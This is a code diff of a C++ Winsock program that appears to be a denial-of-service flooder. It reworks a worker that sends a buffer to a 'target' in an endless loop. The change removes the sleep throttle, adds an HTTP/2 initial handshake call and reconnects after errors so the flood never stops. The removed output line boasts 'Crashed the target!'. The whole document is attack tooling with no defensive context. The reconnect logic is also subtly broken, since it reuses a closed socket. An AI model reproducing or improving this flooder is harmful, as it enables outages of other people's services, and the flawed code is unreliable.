@@ -1,21 +1,26 @@
 #include "hdr.h"
 
-void worker(SOCKET sock, char* buf, int blen) {
+void worker(addrinfo* addr, char* buf, int blen) {
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    connect(sock, addr->ai_addr, addr->ai_addrlen);
+    http2_initial(sock);
+
     while (1) {
         if (send(sock, buf, blen, NULL) == SOCKET_ERROR) {
-            cout << "Crashed the target!                                                        " << endl;
+            closesocket(sock);
+            connect(sock, addr->ai_addr, addr->ai_addrlen);
         }
-        Sleep(10);
     }
 }
 
-SOCKET connect_host(string ip, string port) {
+addrinfo* find_host(string ip, string port) {
     WSADATA wd;
     SOCKET sock = INVALID_SOCKET;
     addrinfo* res = NULL, * ptr = NULL, hints;
 
     if (WSAStartup(MAKEWORD(2, 2), &wd) != 0) {
-        return -1;
+        cout << "Error starting winsock" << endl;
+        return 0;
     }
 
     ZeroMemory(&hints, sizeof(hints));
@@ -24,13 +29,15 @@ SOCKET connect_host(string ip, string port) {
     hints.ai_protocol = IPPROTO_TCP;
 
     if (getaddrinfo(ip.c_str(), port.c_str(), &hints, &res) != 0) {
-        return -2;
+        cout << "The target could not be found." << endl;
+        return 0;
     }
 
     for (ptr = res; ptr != NULL; ptr = ptr->ai_next) {
         sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
         if (sock == INVALID_SOCKET) {
-            return -3;
+            cout << "Error creating socket." << endl;
+            return 0;
         }
 
         if (connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
@@ -42,9 +49,5 @@ SOCKET connect_host(string ip, string port) {
         break;
     }
 
-    if (ptr == NULL) {
-        return -4;
-    }
-
-    return sock;
+    return ptr;
 }
